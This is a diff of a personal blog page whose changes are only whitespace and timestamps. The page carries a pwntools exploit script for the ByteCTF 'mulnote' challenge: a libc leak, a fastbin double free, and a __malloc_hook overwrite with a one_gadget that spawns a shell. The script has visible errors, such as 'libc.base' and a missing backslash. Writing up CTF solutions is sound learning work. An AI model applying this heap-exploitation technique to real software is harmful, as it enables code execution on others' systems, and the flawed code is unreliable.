@@ -86,17 +86,17 @@
 
 
 
-<meta name="description" content="mulnote简单的组合攻击 from pwn import *context.log_level = ‘debug’ sh = process(‘./mulnote’)elf = ELF(‘mulnote’)lib = ELF(‘./libc.so’) def    choice(achar):        sh.sendlineafter(‘&amp;gt;’,achar) def    add(s">
+<meta name="description" content="mulnote简单的组合攻击 from pwn import *context.log_level = ‘debug’ sh = process(‘./mulnote’)elf = ELF(‘mulnote’)lib = ELF(‘./libc.so’) def    choice(achar):            sh.sendlineafter(‘&amp;gt;’,achar) def    a">
 <meta property="og:type" content="article">
 <meta property="og:title" content="byte ctf (pwn)">
 <meta property="og:url" content="http://yoursite.com/2019/10/04/byte ctf (pwn)/index.html">
 <meta property="og:site_name" content="zhz&#39;blog">
-<meta property="og:description" content="mulnote简单的组合攻击 from pwn import *context.log_level = ‘debug’ sh = process(‘./mulnote’)elf = ELF(‘mulnote’)lib = ELF(‘./libc.so’) def    choice(achar):        sh.sendlineafter(‘&amp;gt;’,achar) def    add(s">
+<meta property="og:description" content="mulnote简单的组合攻击 from pwn import *context.log_level = ‘debug’ sh = process(‘./mulnote’)elf = ELF(‘mulnote’)lib = ELF(‘./libc.so’) def    choice(achar):            sh.sendlineafter(‘&amp;gt;’,achar) def    a">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-10-04T06:39:59.118Z">
+<meta property="og:updated_time" content="2019-10-04T07:07:08.386Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="byte ctf (pwn)">
-<meta name="twitter:description" content="mulnote简单的组合攻击 from pwn import *context.log_level = ‘debug’ sh = process(‘./mulnote’)elf = ELF(‘mulnote’)lib = ELF(‘./libc.so’) def    choice(achar):        sh.sendlineafter(‘&amp;gt;’,achar) def    add(s">
+<meta name="twitter:description" content="mulnote简单的组合攻击 from pwn import *context.log_level = ‘debug’ sh = process(‘./mulnote’)elf = ELF(‘mulnote’)lib = ELF(‘./libc.so’) def    choice(achar):            sh.sendlineafter(‘&amp;gt;’,achar) def    a">
 
 
 
@@ -399,12 +399,12 @@
         <p><strong>mulnote</strong><br>简单的组合攻击</p>
 <p>from pwn import *<br>context.log_level = ‘debug’</p>
 <p>sh = process(‘./mulnote’)<br>elf = ELF(‘mulnote’)<br>lib = ELF(‘./libc.so’)</p>
-<p>def    choice(achar):<br>        sh.sendlineafter(‘&gt;’,achar)</p>
-<p>def    add(size,con):<br>        sh.sendline(‘C’)<br>        sh.sendlineafter(‘&gt;’,str(size))<br>        sh.sendlineafter(‘&gt;’,con)</p>
-<p>def    show():<br>        sh.sendline(‘S’)</p>
-<p>def    free(idx):<br>        sh.sendline(‘R’)<br>        sh.sendlineafter(‘&gt;’,str(idx))</p>
-<p>def    edit(idx,con):<br>        sh.sendline(‘E’)<br>        sh.sendlineafter(‘&gt;’,str(idx))<br>        sh.sendlineafter(‘&gt;’,con)</p>
-<p>##################################leak libc################################################<br>add(0x100,’0’)<br>add(0x20,’1’)<br>free(0)<br>add(0x100,’A’)<br>show()<br>libc = u64(sh.recvuntil(‘\x7f’)[-4:].ljust(8,”\x00”))<br>log.success(“libc = %s”%hex(libc))<br>libc_base = libc - 0x3c<br>log.success(“libc_base = %s”%hex(libc_base))<br>malloc_hook = libc_base + lib.symbols[‘__malloc_hook’]<br>one = libc.base + 0x45216<br>######################################<br>add(0x60,’3’)<br>add(0x60,’4’)<br>free(3)<br>free(4)<br>free(3)</p>
+<p>def    choice(achar):<br>            sh.sendlineafter(‘&gt;’,achar)</p>
+<p>def    add(size,con):<br>            sh.sendline(‘C’)<br>            sh.sendlineafter(‘&gt;’,str(size))<br>            sh.sendlineafter(‘&gt;’,con)</p>
+<p>def    show():<br>            sh.sendline(‘S’)</p>
+<p>def    free(idx):<br>            sh.sendline(‘R’)<br>            sh.sendlineafter(‘&gt;’,str(idx))</p>
+<p>def    edit(idx,con):<br>            sh.sendline(‘E’)<br>            sh.sendlineafter(‘&gt;’,str(idx))<br>            sh.sendlineafter(‘&gt;’,con)</p>
+<p>########################leak libc#####################<br>add(0x100,’0’)<br>add(0x20,’1’)<br>free(0)<br>add(0x100,’A’)<br>show()<br>libc = u64(sh.recvuntil(‘\x7f’)[-4:].ljust(8,”\x00”))<br>log.success(“libc = %s”%hex(libc))<br>libc_base = libc - 0x3c<br>log.success(“libc_base = %s”%hex(libc_base))<br>malloc_hook = libc_base + lib.symbols[‘__malloc_hook’]<br>one = libc.base + 0x45216<br>######################################<br>add(0x60,’3’)<br>add(0x60,’4’)<br>free(3)<br>free(4)<br>free(3)</p>
 <p>add(0x60,p64(malloc_hook-0x23)) #5<br>add(0x60,’6’)<br>add(0x60,’7’)<br>add(0x60,’x00’*0x13+p64(one)) #8<br>sh.sendlineafter(‘&gt;’,’C’)<br>sh.sendlineafter(‘size&gt;’,1)</p>
 <p>sh.interactive()</p>
 
